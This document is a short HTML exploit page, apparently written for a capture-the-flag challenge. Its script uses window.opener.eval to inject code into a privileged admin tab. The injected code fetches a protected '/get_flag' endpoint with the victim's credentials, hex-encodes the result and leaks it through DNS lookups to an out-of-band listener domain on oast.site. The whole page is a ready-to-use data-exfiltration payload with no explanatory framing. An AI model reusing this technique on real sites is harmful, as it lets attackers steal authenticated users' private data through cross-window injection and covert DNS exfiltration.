<!DOCTYPE html>
<html><body>
<script>
if (window.opener) {
  // Inject into the admin tab:
  window.opener.eval(`
    (async ()=> {
      // 1) pull the flag
      const res  = await fetch('/get_flag', { credentials: 'include' });
      const flag = await res.text();     // e.g. '{"flag":"L3AK{…}","message":"…"}'

      // 2) encode as hex
      let hex = Array.from(flag)
                     .map(c => c.charCodeAt(0)
                                  .toString(16)
                                  .padStart(2,'0'))
                     .join('');
      // 3) split into DNS-legal labels (≤63 chars)
      let labels = [];
      for (let i = 0; i < hex.length; i += 63) {
        labels.push(hex.slice(i, i + 63));
      }
      // 4) build your listener domain
      const domain = labels.join('.') + '.bkdxspdaaz5k3bcjumvu0si0h1d7zctqj.oast.site';
      // 5) fire one DNS lookup
      const img = new Image();
      img.src = 'http://' + domain + '/';
      document.body.appendChild(img);
    })();
  `);
}
</script>
</body></html>
